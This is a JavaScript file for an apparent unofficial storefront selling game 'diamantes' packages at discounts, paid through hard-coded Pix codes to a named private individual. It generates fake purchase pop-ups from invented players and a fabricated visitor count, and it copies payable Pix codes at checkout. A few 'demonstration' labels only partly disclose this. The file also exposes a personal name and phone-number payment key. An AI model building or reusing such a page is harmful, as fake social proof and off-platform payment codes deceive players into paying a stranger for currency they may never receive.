
const options=[
 {diamonds:110,price:4.49,pix:'00020126330014br.gov.bcb.pix01115529342086052040000530398654044.495802BR5925MIKAEL EDUARDO RODRIGUES 6009SAO PAULO62070503***630408CC'},
 {diamonds:451,price:11.99,pix:'00020126330014br.gov.bcb.pix011155293420860520400005303986540511.995802BR5925MIKAEL EDUARDO RODRIGUES 6009SAO PAULO62070503***63044BD4',originalPrice:13.99,discount:14},
 {diamonds:582,price:17.99,pix:'00020126330014br.gov.bcb.pix011155293420860520400005303986540517.995802BR5925MIKAEL EDUARDO RODRIGUES 6009SAO PAULO62070503***63043E64',originalPrice:20.99,discount:14},
 {diamonds:1166,price:36.99,pix:'00020126360014br.gov.bcb.pix0114+5522981701415520400005303986540536.995802BR5925MIKAEL EDUARDO RODRIGUES 6009SAO PAULO62070503***630402EA',originalPrice:44.99,discount:18,recommended:true},
 {diamonds:2398,price:69.99,pix:'00020126360014br.gov.bcb.pix0114+5522981701415520400005303986540569.995802BR5925MIKAEL EDUARDO RODRIGUES 6009SAO PAULO62070503***63040279',originalPrice:87.99,discount:20},
 {diamonds:6160,price:159.99,pix:'00020126360014br.gov.bcb.pix0114+55229817014155204000053039865406159.995802BR5925MIKAEL EDUARDO RODRIGUES 6009SAO PAULO62070503***6304F455',originalPrice:209.99,discount:24}
];
const fmt=n=>n.toLocaleString('pt-BR',{style:'currency',currency:'BRL'});
let selected=null;

// Atividade visual de demonstração. Não representa compras nem visitantes reais.
const demoToast = document.getElementById('demoToast');
const demoOnline = document.getElementById('onlineCount');
const demoBuyers = ['Jogador ***4821','Jogador ***0937','Jogador ***6154','Jogador ***2086','Jogador ***7740'];
let toastTimer;
function showDemoActivity(){
  const p = options[Math.floor(Math.random()*options.length)];
  const buyer = demoBuyers[Math.floor(Math.random()*demoBuyers.length)];
  document.getElementById('toastTitle').textContent = 'Atividade demonstrativa';
  document.getElementById('toastText').textContent = `${buyer} — pacote de ${p.diamonds.toLocaleString('pt-BR')} diamantes (${fmt(p.price)})`;
  demoToast.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(()=>demoToast.classList.remove('show'),5500);
  const next = 1000 + Math.floor(Math.random()*801);
  demoOnline.textContent = next >= 1000 ? (next/1000).toFixed(1).replace('.',',')+' mil' : String(next);
  setTimeout(showDemoActivity, 10000 + Math.floor(Math.random()*20001));
}
setTimeout(showDemoActivity, 7000);

const grid=document.getElementById('packages');
options.forEach((o,i)=>{
 const b=document.createElement('button');b.type='button';b.className='pack';b.innerHTML=
 `${o.recommended?'<span class="recommend">RECOMENDADO</span>':''}${o.discount?`<span class="sale-tag">-${o.discount}%</span>`:''}<span class="amount">${o.diamonds}</span><small>DIAMANTES</small><div class="gem">💎</div>${o.originalPrice?`<span class="old-price">${fmt(o.originalPrice)}</span>`:''}<div class="price">${fmt(o.price)}</div>`;
 b.addEventListener('click',()=>{
  selected=i;document.querySelectorAll('.pack').forEach(x=>x.classList.remove('selected'));b.classList.add('selected');
  document.getElementById('chosenText').textContent=`${o.diamonds} diamantes — ${fmt(o.price)}`;
  document.getElementById('continue').disabled=false;
 });grid.appendChild(b);
});
document.getElementById('continue').addEventListener('click',()=>{
 const id=document.getElementById('player').value.trim();
 if(!id){alert('Informe o ID do jogador para continuar.');document.getElementById('player').focus();return;}
 const o=options[selected];
 document.getElementById('summary').textContent=`${o.diamonds.toLocaleString('pt-BR')} diamantes — ${fmt(o.price)}`;
 document.getElementById('playerSummary').textContent=`ID do jogador: ${id}`;
 document.getElementById('pixCode').value=o.pix;
 document.getElementById('catalog').classList.add('hidden');
 document.getElementById('checkout').classList.remove('hidden');
 document.getElementById('bottom').classList.add('hidden');
 window.scrollTo(0,0);
});
document.getElementById('back').addEventListener('click',()=>{
 document.getElementById('checkout').classList.add('hidden');document.getElementById('catalog').classList.remove('hidden');
 document.getElementById('bottom').classList.remove('hidden');window.scrollTo(0,0);
});
document.getElementById('copyPix').addEventListener('click',async()=>{
 const code=document.getElementById('pixCode').value;
 try{await navigator.clipboard.writeText(code);document.getElementById('copyPix').textContent='Código Pix copiado!';}
 catch(e){document.getElementById('pixCode').focus();document.getElementById('pixCode').select();alert('Selecione e copie o código Pix.');}
});
document.getElementById('copy').addEventListener('click',async()=>{
 const text=document.getElementById('summary').textContent+' | '+document.getElementById('playerSummary').textContent+' | DEMONSTRAÇÃO — NÃO PAGAR';
 try{await navigator.clipboard.writeText(text);document.getElementById('copy').textContent='Resumo copiado!';}
 catch(e){alert(text);}
});
